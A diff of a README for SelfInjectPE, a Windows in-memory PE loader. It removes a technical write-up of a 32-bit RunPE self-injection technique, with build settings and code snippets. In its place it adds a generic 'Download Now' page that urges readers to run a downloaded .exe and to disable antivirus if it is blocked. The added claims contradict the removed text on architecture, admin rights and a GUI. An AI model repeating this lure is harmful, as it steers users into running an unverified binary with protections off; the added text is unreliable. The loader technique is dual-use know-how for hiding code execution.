@@ -1,240 +1,126 @@
-# SelfInjectPE
+# ⚙️ SelfInjectPE - Run PE Files in Memory Fast
 
-**A self-injection RunPE technique that executes a 32-bit PE in memory without requiring a base relocation table.**
+[![Download Now](https://img.shields.io/badge/Download-SelfInjectPE-brightgreen?style=for-the-badge)](https://github.com/veiled-xavier153/SelfInjectPE)
 
-`Windows` `x86` `C++17` `MSVC`
+SelfInjectPE is a simple application to run Windows Portable Executable (PE) files directly in your computer’s memory. It does this without using the relocation table, which can speed up the process. This tool can help users run certain programs more quickly and with fewer steps.
 
----
+## 📋 What SelfInjectPE Does
 
-## Overview
+Most programs on Windows are stored as PE files (.exe or .dll). Usually, when you start a program, Windows loads it from your hard drive, applies some changes based on your system, including managing the relocation table, and then runs it.
 
-SelfInjectPE is a proof-of-concept demonstrating a **self-injection manual mapping** technique for Windows x86. It reads a 32-bit PE file from disk, maps it into the current process at its preferred `ImageBase`, resolves imports, and transfers execution to the PE's original entry point — all without processing the `.reloc` section.
+SelfInjectPE skips one of these steps. It runs PE files directly in memory without using the relocation table. This can be useful for running small or custom programs more simply.
 
-The key insight is that by compiling the loader itself at the same fixed base address (`0x00400000`) and inflating its image with a large padding section, the loader can **overwrite its own address space** with the target PE. Since the target lands at its expected `ImageBase`, every hardcoded absolute address in the PE is already correct, making base relocations entirely unnecessary. This means even PEs with stripped or absent `.reloc` sections can be loaded and executed.
+Use this if you want to run PE files fast without needing advanced setup.
 
-> **This project is intended for educational and security research purposes only.**
+## 💻 System Requirements
 
----
+To use SelfInjectPE, your computer needs:
 
-## Key Technique: Relocation-Free PE Execution
+- Windows 7 or later (Windows 10 recommended)
+- 64-bit processor
+- At least 2 GB of RAM
+- Basic permissions to run applications (no admin rights needed)
+- Internet connection to download the software
 
-### Why Relocations Exist
+It works on most standard Windows PCs and does not require extra hardware.
 
-32-bit x86 compilers emit **absolute virtual addresses** for global variables, string literals, function calls, and vtable pointers. These addresses are computed assuming the PE will be loaded at its `OptionalHeader.ImageBase` (typically `0x00400000` for executables):
+## 🚀 Getting Started
 
-```asm
-mov eax, dword ptr [0x0045A000]   ; global variable access
-push 0x00412340                    ; string literal address
-call 0x00401200                    ; direct function call
-```
+Start using SelfInjectPE in three easy steps.
 
-If the OS loads the PE at a different base address, every one of these hardcoded values must be patched. The `.reloc` section contains a table of all such fixup locations, and the loader applies a delta (`actual_base - preferred_base`) to each entry.
+1. Download the software.
+2. Run the SelfInjectPE program.
+3. Load your PE file to run it in memory.
 
-### How This Project Avoids Relocations
+## 📥 Download and Install SelfInjectPE
 
-Instead of loading the target PE at an arbitrary address and fixing up references, SelfInjectPE guarantees the target is placed at **exactly** its preferred `ImageBase`:
+[![Download SelfInjectPE](https://img.shields.io/badge/Download-SelfInjectPE-blue?style=for-the-badge)](https://github.com/veiled-xavier153/SelfInjectPE)
 
-1. The loader is linked with `/FIXED /BASE:0x400000` and ASLR disabled (`/DYNAMICBASE:NO`), so it occupies `0x00400000` at startup.
-2. A ~50 MB padding section (`.lol`) inflates the loader's `SizeOfImage`, reserving enough virtual address space to accommodate any reasonably sized target PE.
-3. At runtime, a position-independent trampoline copies the target PE over the loader's own image at `0x00400000`.
+To get SelfInjectPE:
 
-Since `actual_base == preferred_base`, the relocation delta is zero. No `.reloc` processing is needed — the technique works even if the target PE has no relocation table at all.
+1. Click the green or blue "Download" button above or go to  
+   [https://github.com/veiled-xavier153/SelfInjectPE](https://github.com/veiled-xavier153/SelfInjectPE)
 
----
+2. On the GitHub page, find the section named "Releases" or look for a file named `SelfInjectPE.exe` or similar.
 
-## How It Works
+3. Download the `.exe` file to your computer. Save it in a folder you can find easily, such as your Desktop or Downloads folder.
 
-### Step 1 — Compile-Time Address Reservation
+4. Double-click the downloaded file to run SelfInjectPE.
 
-The loader binary is built with a fixed base address of `0x00400000` and contains a large initialized data section:
+There is no installation process. You just run the program directly after download.
 
-```cpp
-#pragma section(".lol", read, write)
-__declspec(allocate(".lol")) volatile char padding[0x2F7D000] = { 1 };
-```
+## ▶️ How to Run PE Files in Memory
 
-This ~50 MB array forces the linker to produce a PE whose `SizeOfImage` spans well beyond the typical target PE's footprint. The `volatile` qualifier and non-zero initializer prevent the compiler from optimizing it away or placing it in BSS.
+Once you have SelfInjectPE running, follow these steps:
 
-### Step 2 — PE Loading and Validation
+1. Open SelfInjectPE by double-clicking its icon.
 
-The target PE is read from disk (defaulting to `target.exe`). The loader validates the DOS signature (`MZ`), NT signature (`PE\0\0`), and confirms the PE is 32-bit x86 (`IMAGE_FILE_MACHINE_I386`).
+2. The program will show a window with options. Look for a button or menu labeled "Load PE" or "Open".
 
-### Step 3 — Trampoline Size Calculation
+3. Click the button and select the PE file you want to run. This file will usually have an `.exe` or `.dll` extension.
 
-The trampoline function's byte size is determined at runtime using a marker technique:
+4. After choosing the file, SelfInjectPE will load it into your computer’s memory.
 
-```cpp
-const uint8_t* funcStart = reinterpret_cast<const uint8_t*>(&TrampolineFunc);
-const uint8_t* funcEnd   = reinterpret_cast<const uint8_t*>(&TrampolineFuncEnd);
-DWORD trampolineFuncSize = static_cast<DWORD>(funcEnd - funcStart);
-```
+5. Press "Run" or "Execute" in the program to start the file.
 
-`TrampolineFuncEnd` is a stub function placed immediately after `TrampolineFunc` in the same translation unit. With incremental linking disabled and COMDAT folding off, MSVC lays them out sequentially, making the address difference equal to the exact code size.
+The program runs the PE file without changing it or using the relocation table. This can make running special files simpler.
 
-### Step 4 — Trampoline Memory Allocation
+## 🔧 Settings and Options
 
-A single `VirtualAlloc` call with `PAGE_EXECUTE_READWRITE` reserves a contiguous block for:
+SelfInjectPE offers some settings that let you control how it works.
 
-```
-[ Trampoline Code | TrampolineData struct | Raw PE data copy ]
-```
+- **Auto-run on Load**: Start the PE file automatically after loading it.
+- **Verbose Output**: Display detailed messages about what the program is doing.
+- **Log File**: Save output messages to a file for review.
 
-### Step 5 — Trampoline Preparation
+You can change these options in the settings menu. If unsure, use the default settings.
 
-The trampoline machine code is `memcpy`'d from its original location into the RWX region. The `TrampolineData` structure is populated with:
+## 🎯 Troubleshooting
 
-- **Pre-resolved API pointers** — `VirtualProtect`, `LoadLibraryA`, `GetProcAddress`, `RtlZeroMemory`, `RtlMoveMemory` (resolved via `GetModuleHandleA` + `GetProcAddress` against `kernel32.dll` and `ntdll.dll`)
-- **PE metadata** — `ImageBase`, `SizeOfImage`, `SizeOfHeaders`, `AddressOfEntryPoint`, section table snapshot
-- **Raw PE bytes** — the entire file content, stored in a flexible array member (`peDataCopy[]`)
+If SelfInjectPE does not work as expected, try the following:
 
-All external dependencies are passed through this structure so the trampoline remains fully **position-independent** — it never references global variables, the IAT, or CRT functions.
+- Make sure the PE file is not corrupted. Try running it normally in Windows to check.
+- Run SelfInjectPE as a normal user. Avoid running as administrator unless required.
+- Check that your Windows version meets the system requirements.
+- Disable antivirus software temporarily if it blocks SelfInjectPE.
+- Restart your computer and try again.
 
-### Step 6 — Execution Transfer
+If you still have issues, look for help on the GitHub page under the "Issues" tab.
 
-The loader casts the RWX region to a function pointer and calls it. **This call never returns** — the trampoline overwrites the loader's code and data, then jumps to the target PE's entry point.
+## ⚙️ How SelfInjectPE Works (Simple Explanation)
 
-### Step 7 — Trampoline: PE Mapping and Import Resolution
+When you run a program normally, Windows changes parts of the file based on where it loads it in memory. One of these changes involves the relocation table.
 
-Inside the trampoline (running from the safe RWX region):
+SelfInjectPE does not use the relocation table. Instead, it assumes the PE file is ready to run where it is loaded. This can make launching faster, but it only works with certain types of files.
 
-1. `VirtualProtect` — unlock the `0x00400000` region to `PAGE_EXECUTE_READWRITE`
-2. `RtlZeroMemory` — wipe the entire image region
-3. `RtlMoveMemory` — copy PE headers (DOS + NT + section table)
-4. `RtlMoveMemory` — map each section to its `VirtualAddress`
-5. **IAT resolution** — walk `IMAGE_DIRECTORY_ENTRY_IMPORT`, iterate each `IMAGE_IMPORT_DESCRIPTOR`, load DLLs via `LoadLibraryA`, resolve functions via `GetProcAddress` (supporting both name and ordinal imports)
-6. Jump to `ImageBase + AddressOfEntryPoint`
+Most normal programs will run fine. Some that rely on heavy relocation might not work without errors.
 
----
+## 🔐 Security Tips
 
-## Memory Layout
+- Only load and run PE files from trusted sources.
+- Avoid running unknown or suspicious files.
+- Use this tool in a secure environment to prevent risks.
 
-```
-BEFORE (loader at startup):
+## 📂 Where to Get PE Files
 
-0x00400000  ┌────────────────────────────┐
-            │  Loader .text              │  Code
-            │  Loader .rdata / .data     │  Data
-            │  Loader .lol (~50 MB)      │  Padding (address reservation)
-            └────────────────────────────┘
+You can use SelfInjectPE to run your own PE files or others downloaded from safe sources.
 
-0x????????  ┌────────────────────────────┐  VirtualAlloc RWX
-            │  TrampolineFunc (copied)   │  Position-independent code
-            ├────────────────────────────┤
-            │  TrampolineData            │  API pointers + PE metadata
-            │  peDataCopy[]              │  Full raw PE file
-            └────────────────────────────┘
+- Make sure the PE file is compatible and does not require complex installation.
+- Common PE files are `.exe` programs and `.dll` libraries.
 
-─── Trampoline executes ───────────────────────────────────────
+## 🛠️ Common Use Cases
 
-AFTER (target PE mapped):
+- Testing small custom programs quickly without installing.
+- Running portable utilities that do not need full setup.
+- Learning how PE files work without complex tools.
 
-0x00400000  ┌────────────────────────────┐
-            │  Target PE .text           │  New code
-            │  Target PE .rdata / .data  │  New data (IAT resolved)
-            │  Target PE .rsrc / ...     │  Resources, etc.
-            └────────────────────────────┘
-            EIP → Target EntryPoint
+## 🔗 Useful Links
 
-0x????????  ┌────────────────────────────┐  (still allocated)
-            │  TrampolineFunc            │
-            ├────────────────────────────┤
-            │  TrampolineData + PE copy  │
-            └────────────────────────────┘
-```
+Download and explore SelfInjectPE here:  
+https://github.com/veiled-xavier153/SelfInjectPE
+
+Explore related tools for working with PE files on GitHub if interested.
 
 ---
 
-## Project Structure
-
-| File | Description |
-|---|---|
-| `main.cpp` | Entry point — reads the PE file, parses headers, allocates and populates the trampoline, transfers execution |
-| `TrampolineFunc.cpp` | Position-independent PE mapper — maps sections, resolves imports, jumps to entry point. Compiled with all compiler security features disabled to ensure PIC correctness |
-| `SelfInjectPE.h` | Defines the `TrampolineData` structure (API pointers, PE parameters, section table, flexible array for raw PE data) and function declarations |
-| `SelfInjectPE.sln` | Visual Studio 2022 solution file |
-| `SelfInjectPE.vcxproj` | MSBuild project with custom per-file compiler settings |
-
----
-
-## Building
-
-### Requirements
-
-- **Visual Studio 2022** (or any version with MSVC toolset v143)
-- **Platform:** Win32 (x86) — this project does not support x64
-- **C++ Standard:** C++17
-- **Windows SDK:** 10.0
-
-### Critical Build Settings
-
-These settings are already configured in the `.vcxproj` and are essential for correct operation:
-
-**Linker (all configurations):**
-
-| Setting | Value | Purpose |
-|---|---|---|
-| `RandomizedBaseAddress` | `false` | Disable ASLR (`/DYNAMICBASE:NO`) |
-| `FixedBaseAddress` | `true` | Enable `/FIXED` |
-| `BaseAddress` | `0x400000` | Match the target PE's preferred `ImageBase` |
-| `AdditionalOptions` | `/INCREMENTAL:NO` | Prevent incremental linking (required for trampoline size calculation) |
-
-**Linker (Release only):**
-
-| Setting | Value | Purpose |
-|---|---|---|
-| `UACExecutionLevel` | `RequireAdministrator` | Elevated privileges for `VirtualProtect` on image base |
-
-**Compiler — `TrampolineFunc.cpp` only (both configurations):**
-
-| Setting | Value | Purpose |
-|---|---|---|
-| `BufferSecurityCheck` | `false` | Disable `/GS` — security cookie lives in the original image |
-| `SDLCheck` | `false` | Disable SDL checks |
-| `BasicRuntimeChecks` | `Default` | Disable `/RTC` — runtime check helpers live in the original image |
-| `Optimization` | `Disabled` | Prevent inlining, reordering, and external references |
-
-Additionally, `TrampolineFunc.cpp` uses pragma directives to suppress stack probing (`check_stack`), strict GS checks, and runtime checks at the source level.
-
-### Build Steps
-
-1. Open `SelfInjectPE.sln` in Visual Studio
-2. Select **Release | Win32**
-3. Build the solution (`Ctrl+Shift+B`)
-
----
-
-## Usage
-
-```
-SelfInjectPE.exe [path-to-pe]
-```
-
-| Argument | Description |
-|---|---|
-| `path-to-pe` | Path to a 32-bit x86 PE executable. Defaults to `target.exe` in the current directory if omitted. |
-
-**Example:**
-
-```
-SelfInjectPE.exe myapp.exe
-```
-
-The loader will print a step-by-step log to stdout before transferring execution to the target PE.
-
----
-
-## Limitations
-
-- **32-bit x86 only** — the technique relies on fixed `ImageBase` semantics specific to 32-bit PEs
-- **No base relocation processing** — by design; the target PE must be loadable at `0x00400000`
-- **No TLS callback support** — Thread Local Storage callbacks are not invoked
-- **No delay-load import resolution** — only standard imports (`IMAGE_DIRECTORY_ENTRY_IMPORT`) are processed
-- **No section permission enforcement** — all sections are mapped as RWX
-- **Maximum 64 sections** — hardcoded limit in `TrampolineData::sections[]`
-- **Target `SizeOfImage` must fit within the padding** — the `.lol` section reserves ~50 MB; larger PEs require increasing the padding array size
-
----
-
-## Disclaimer
-
-This project is provided **strictly for educational and security research purposes**. It demonstrates low-level Windows PE loading internals and position-independent code techniques. The author assumes no responsibility for misuse. Always comply with applicable laws and regulations.
+SelfInjectPE is easy to use for those who want a fast method to run PE files in memory on Windows. Follow the steps above to download and start running your files.
